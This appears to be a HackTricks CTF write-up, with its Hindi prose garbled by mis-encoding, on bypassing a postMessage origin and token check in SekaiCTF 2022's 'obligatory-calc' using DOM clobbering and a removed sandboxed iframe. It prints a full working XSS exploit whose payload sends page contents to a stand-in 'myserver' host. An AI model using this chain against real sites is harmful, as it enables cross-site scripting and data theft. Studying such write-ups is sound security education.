# рдЖрдИрдлреНрд░реЗрдореНрд╕ рдХреЗ рд╕рд╛рде SOP рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдирд╛ - 2

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ред
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **Twitter** ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>

## SOP-2 рдореЗрдВ рдЖрдИрдлреНрд░реЗрдореНрд╕

рдЗрд╕ [**рдЪреБрдиреМрддреА**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc) рдХреЗ [**рд╕рдорд╛рдзрд╛рди**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc/solution) рдореЗрдВ, [**@Strellic\_**](https://twitter.com/Strellic\_) рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдХреА рдПрдХ рд╕рдорд╛рди рд╡рд┐рдзрд┐ рдХрд╛ рдкреНрд░рд╕реНрддрд╛рд╡ рджреЗрддреЗ рд╣реИрдВред рдЪрд▓рд┐рдП рдЗрд╕реЗ рдЬрд╛рдВрдЪрддреЗ рд╣реИрдВред

рдЗрд╕ рдЪреБрдиреМрддреА рдореЗрдВ рд╣рдореЗрдВ рдЖрдХреНрд░рдордХ рдХреЛ рдЗрд╕реЗ **рдмрд╛рдЗрдкрд╛рд╕** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
```javascript
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
```
рдЕрдЧрд░ рд╡рд╣ рдРрд╕рд╛ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ **postmessage** рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ HTML рд╕рд╛рдордЧреНрд░реА рд╣реЛрдЧреА рдЬреЛ **`innerHTML`** рдХреЗ рд╕рд╛рде рдкреЗрдЬ рдореЗрдВ рд▓рд┐рдЦреА рдЬрд╛рдПрдЧреА рдмрд┐рдирд╛ рд╕реЗрдирд┐рдЯреЗрд╢рди рдХреЗ (**XSS**).

**рдкрд╣рд▓реА рдЬрд╛рдБрдЪ** рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ **`window.calc.contentWindow`** рдХреЛ **`undefined`** рдФрд░ **`e.source`** рдХреЛ **`null`** рдмрдирд╛рдирд╛:

* **`window.calc.contentWindow`** рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **`document.getElementById("calc")`** рд╣реИред рдЖрдк **`document.getElementById`** рдХреЛ **`<img name=getElementById />`** рдХреЗ рд╕рд╛рде рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕реИрдирд┐рдЯрд╛рдЗрдЬрд╝рд░ рдПрдкреАрдЖрдИ -[рдпрд╣рд╛рдБ](https://wicg.github.io/sanitizer-api/#dom-clobbering)- DOM clobbering рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рд╣реИ)ред
* рдЗрд╕рд▓рд┐рдП, рдЖрдк **`document.getElementById("calc")`** рдХреЛ **`<img name=getElementById /><div id=calc></div>`** рдХреЗ рд╕рд╛рде рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдлрд┐рд░, **`window.calc`** **`undefined`** рд╣реЛ рдЬрд╛рдПрдЧрд╛ред
* рдЕрдм, рд╣рдореЗрдВ **`e.source`** рдХреЛ **`undefined`** рдпрд╛ **`null`** рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ `==` рдХрд╛ рдЙрдкрдпреЛрдЧ `===` рдХреЗ рдмрдЬрд╛рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, **`null == undefined`** **`True`** рд╣реИ)ред рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ "рдЖрд╕рд╛рди" рд╣реИред рдпрджрд┐ рдЖрдк рдПрдХ **iframe** рдмрдирд╛рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рд╕реЗ **postMessage** рднреЗрдЬрддреЗ рд╣реИрдВ рдФрд░ рддреБрд░рдВрдд **remove** рдХрд░ рджреЗрддреЗ рд╣реИрдВ, рддреЛ **`e.origin`** **`null`** рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ
```javascript
let iframe = document.createElement('iframe');
document.body.appendChild(iframe);
window.target = window.open("http://localhost:8080/");
await new Promise(r => setTimeout(r, 2000)); // wait for page to load
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`);
document.body.removeChild(iframe); //e.origin === null
```
рджреВрд╕рд░реА рдЬрд╛рдБрдЪ рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЯреЛрдХрди** рдХреЗ рд╕рд╛рде рдорд╛рди `null` рднреЗрдЬрдХрд░ рдФрд░ **`window.token`** рдХреЛ рдорд╛рди **`undefined`** рдмрдирд╛рдХрд░:

* **`token`** рдХреЛ рдорд╛рди `null` рдХреЗ рд╕рд╛рде postMessage рднреЗрдЬрдирд╛ рд╕рд░рд▓ рд╣реИред
* **`window.token`** **`document.cookie`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ **`getCookie`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдирд╛ рд╣реИред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`null`** рдореВрд▓ рд╕реНрдерд╛рди рдкреГрд╖реНрдареЛрдВ рдореЗрдВ **`document.cookie`** рддрдХ рдкрд╣реБрдБрдЪ рдХрд┐рд╕реА **рддреНрд░реБрдЯрд┐** рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ред рдЗрд╕рд╕реЗ **`window.token`** рдХрд╛ рдорд╛рди **`undefined`** рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

[**@terjanq**](https://twitter.com/terjanq) рджреНрд╡рд╛рд░рд╛ рдЕрдВрддрд┐рдо рд╕рдорд╛рдзрд╛рди [**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд**](https://gist.github.com/terjanq/0bc49a8ef52b0e896fca1ceb6ca6b00e#file-calc-html) рд╣реИ:
```html
<html>
<body>
<script>
// Abuse "expr" param to cause a HTML injection and
// clobber document.getElementById and make window.calc.contentWindow undefined
open('https://obligatory-calc.ctf.sekai.team/?expr="<form name=getElementById id=calc>"');

function start(){
var ifr = document.createElement('iframe');
// Create a sandboxed iframe, as sandboxed iframes will have origin null
// this null origin will document.cookie trigger an error and window.token will be undefined
ifr.sandbox = 'allow-scripts allow-popups';
ifr.srcdoc = `<script>(${hack})()<\/script>`

document.body.appendChild(ifr);

function hack(){
var win = open('https://obligatory-calc.ctf.sekai.team');
setTimeout(()=>{
parent.postMessage('remove', '*');
// this bypasses the check if (e.source == window.calc.contentWindow && e.data.token == window.token), because
// token=null equals to undefined and e.source will be null so null == undefined
win.postMessage({token:null, result:"<img src onerror='location=`https://myserver/?t=${escape(window.results.innerHTML)}`'>"}, '*');
},1000);
}

// this removes the iframe so e.source becomes null in postMessage event.
onmessage = e=> {if(e.data == 'remove') document.body.innerHTML = ''; }
}
setTimeout(start, 1000);
</script>
</body>
</html>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХреЛ** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud)** рдХреЛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
